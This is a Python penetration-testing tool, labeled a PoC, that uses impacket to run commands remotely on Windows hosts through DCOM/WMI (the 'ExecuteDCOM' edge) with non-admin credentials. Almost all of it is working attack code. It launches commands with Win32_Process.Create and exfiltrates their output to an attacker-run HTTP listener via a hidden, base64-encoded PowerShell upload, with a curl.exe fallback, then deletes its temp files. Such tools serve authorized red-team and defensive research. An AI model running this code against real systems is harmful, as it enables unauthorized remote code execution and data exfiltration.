#!/usr/bin/env python3
"""
dcom_exec.py — Session-less DCOM code execution via WMI (ExecuteDCOM edge)

Exploits the BloodHound "ExecuteDCOM" edge: a non-admin user with DCOM
Launch/Activation/Access permissions can activate WMI objects remotely
and execute commands via Win32_Process.Create.

Unlike impacket-dcomexec (MMC20/ShellWindows/ShellBrowserWindow — needs a
desktop session), this uses WMI over DCOM. The WMI provider runs in
Session 0 (wmiprvse.exe inside svchost). No interactive session required.

Output retrieval: since the user isn't admin and can't read ADMIN$/C$,
output is retrieved via HTTP callback (the target POSTs output to our
listener) or optionally via a UNC write to an SMB share we host.

Usage:
    dcom_exec.py ecorp.local/dcomuser:DCOMPwn2026!@192.168.15.40 whoami
    dcom_exec.py ecorp.local/dcomuser:DCOMPwn2026!@192.168.15.40 -listener 192.168.15.90 'ipconfig /all'
"""

import argparse
import base64
import http.server
import logging
import random
import string
import socket
import sys
import threading
import time

from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom.wmi import (
    CLSID_WbemLevel1Login,
    IID_IWbemLevel1Login,
    IWbemLevel1Login,
)
from impacket.dcerpc.v5.dtypes import NULL
from impacket.examples.utils import parse_target

logger = logging.getLogger('dcom_exec')


def rand_tag(n=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))


class OutputReceiver:
    """HTTP listener that captures a single POST body then shuts down."""

    def __init__(self, bind_ip='0.0.0.0', port=0):
        self.data = None
        self.ready = threading.Event()
        self.received = threading.Event()
        self.bind_ip = bind_ip

        outer = self

        class Handler(http.server.BaseHTTPRequestHandler):
            def do_POST(self):
                length = int(self.headers.get('Content-Length', 0))
                outer.data = self.rfile.read(length)
                self.send_response(200)
                self.end_headers()
                outer.received.set()

            def log_message(self, fmt, *a):
                logger.debug(fmt % a)

        self.server = http.server.HTTPServer((bind_ip, port), Handler)
        self.port = self.server.server_address[1]

    def start(self):
        self.thread = threading.Thread(target=self._run, daemon=True)
        self.thread.start()
        self.ready.set()

    def _run(self):
        self.server.handle_request()

    def wait(self, timeout=60):
        return self.received.wait(timeout)

    def stop(self):
        self.server.server_close()


def wmi_connect(address, username, password, domain, lmhash='', nthash='',
                do_kerberos=False, kdc_host=None):
    """Establish DCOM connection and return (dcom, iWbemServices)."""
    dcom = DCOMConnection(
        address, username, password, domain, lmhash, nthash,
        oxidResolver=True, doKerberos=do_kerberos, kdcHost=kdc_host)

    iInterface = dcom.CoCreateInstanceEx(
        CLSID_WbemLevel1Login, IID_IWbemLevel1Login)
    iWbemLogin = IWbemLevel1Login(iInterface)
    iWbemServices = iWbemLogin.NTLMLogin('//./root/cimv2', NULL, NULL)
    iWbemLogin.RemRelease()
    return dcom, iWbemServices


def wmi_exec(iWbemServices, command):
    """Execute a command via Win32_Process.Create. Returns (pid, rc)."""
    win32Process, _ = iWbemServices.GetObject('Win32_Process')
    resp = win32Process.Create(command, 'C:\\Windows\\System32', None)
    props = resp.getProperties()
    return props['ProcessId']['value'], props['ReturnValue']['value']


def wmi_wait_pid(iWbemServices, pid, timeout_sec=60):
    """Poll WMI until PID exits."""
    deadline = time.time() + timeout_sec
    while time.time() < deadline:
        try:
            result = iWbemServices.ExecQuery(
                f'SELECT ProcessId FROM Win32_Process WHERE ProcessId = {pid}')
            found = False
            while True:
                try:
                    result.Next(0, 1)
                    found = True
                    break
                except Exception:
                    break
            if not found:
                return True
        except Exception:
            return True
        time.sleep(0.5)
    return False


def execute_with_output(iWbemServices, command, listener_ip, listener_port=0,
                        timeout=60, method='http'):
    """
    Execute command and retrieve output via HTTP callback.

    Flow:
    1. Start HTTP listener on attacker box
    2. WMI: run command → temp file
    3. WMI: PowerShell POSTs temp file contents to our listener
    4. Receive output, decode, return
    5. WMI: cleanup temp file
    """
    tag = rand_tag()
    tmp_file = f'C:\\Windows\\Temp\\{tag}.txt'

    # Start HTTP listener
    receiver = OutputReceiver(port=listener_port)
    receiver.start()
    port = receiver.port
    logger.info(f'HTTP listener on :{port}')

    try:
        # Step 1: Execute command, capture to temp file
        exec_cmd = f'cmd.exe /c "({command}) > {tmp_file} 2>&1"'
        pid, rc = wmi_exec(iWbemServices, exec_cmd)
        if rc != 0:
            raise RuntimeError(f'Win32_Process.Create failed: rc={rc}')
        logger.info(f'Command PID: {pid}')

        wmi_wait_pid(iWbemServices, pid, timeout)
        time.sleep(0.3)

        # Step 2: POST output back via PowerShell
        ps_script = (
            f"$d = [IO.File]::ReadAllBytes('{tmp_file}');"
            f"$w = [Net.WebClient]::new();"
            f"$w.UploadData('http://{listener_ip}:{port}/','POST',$d);"
            f"Remove-Item '{tmp_file}' -Force -EA SilentlyContinue"
        )
        ps_cmd = (
            f'cmd.exe /c powershell.exe -NoP -NonI -W Hidden '
            f'-Enc {base64.b64encode(ps_script.encode("utf-16-le")).decode()}'
        )
        pid2, rc2 = wmi_exec(iWbemServices, ps_cmd)
        if rc2 != 0:
            raise RuntimeError(f'PowerShell callback failed: rc={rc2}')
        logger.info(f'Callback PID: {pid2}')

        # Step 3: Wait for data
        if not receiver.wait(timeout):
            logger.warning('Timeout waiting for HTTP callback')
            # Fallback: try curl.exe
            curl_cmd = (
                f'cmd.exe /c curl.exe -s -X POST '
                f'--data-binary @{tmp_file} '
                f'http://{listener_ip}:{port}/ >nul 2>&1'
            )
            pid3, _ = wmi_exec(iWbemServices, curl_cmd)
            receiver.wait(15)

        if receiver.data is not None:
            return receiver.data.decode('utf-8', errors='replace')
        return None

    finally:
        receiver.stop()
        # Cleanup temp file (fire and forget)
        wmi_exec(iWbemServices, f'cmd.exe /c del /q {tmp_file} >nul 2>&1')


def get_local_ip(target):
    """Get our IP that can route to the target."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((target, 135))
        return s.getsockname()[0]
    finally:
        s.close()


def main():
    parser = argparse.ArgumentParser(
        description='Session-less DCOM exec via WMI — ExecuteDCOM edge PoC')
    parser.add_argument('target', help='[[domain/]username[:password]@]<target>')
    parser.add_argument('command', nargs='*', default=['whoami'],
                        help='Command to execute (default: whoami)')
    parser.add_argument('-listener', metavar='IP',
                        help='Listener IP for HTTP callback (auto-detected if omitted)')
    parser.add_argument('-port', type=int, default=0,
                        help='Listener port (random if 0)')
    parser.add_argument('-hashes', metavar='LMHASH:NTHASH')
    parser.add_argument('-no-pass', action='store_true')
    parser.add_argument('-k', action='store_true', help='Kerberos auth')
    parser.add_argument('-dc-ip', metavar='IP')
    parser.add_argument('-timeout', type=int, default=60)
    parser.add_argument('-debug', action='store_true')

    args = parser.parse_args()
    logging.basicConfig(
        level=logging.DEBUG if args.debug else logging.INFO,
        format='%(message)s')

    domain, username, password, address = parse_target(args.target)
    if domain is None:
        domain = ''
    lmhash = nthash = ''
    if args.hashes:
        lmhash, nthash = args.hashes.split(':')
    if password == '' and username != '' and not args.hashes and not args.no_pass:
        from getpass import getpass
        password = getpass('Password:')

    command = ' '.join(args.command)
    listener_ip = args.listener or get_local_ip(address)

    print(f'[*] Target: {address}', file=sys.stderr)
    print(f'[*] User:   {domain}\\{username}', file=sys.stderr)
    print(f'[*] Listener: {listener_ip}', file=sys.stderr)
    print(f'[*] Connecting via DCOM...', file=sys.stderr)

    dcom, iWbemServices = wmi_connect(
        address, username, password, domain, lmhash, nthash,
        do_kerberos=args.k, kdc_host=args.dc_ip)

    try:
        print(f'[+] DCOM activation + WMI login succeeded (Session 0, no desktop)',
              file=sys.stderr)
        print(f'[*] Executing: {command}', file=sys.stderr)

        output = execute_with_output(
            iWbemServices, command, listener_ip,
            listener_port=args.port, timeout=args.timeout)

        if output:
            sys.stdout.write(output)
            if not output.endswith('\n'):
                print()
        else:
            print('[!] Command executed but no output received', file=sys.stderr)

    except Exception as e:
        if args.debug:
            import traceback
            traceback.print_exc()
        print(f'[-] {e}', file=sys.stderr)
        sys.exit(1)
    finally:
        dcom.disconnect()


if __name__ == '__main__':
    main()
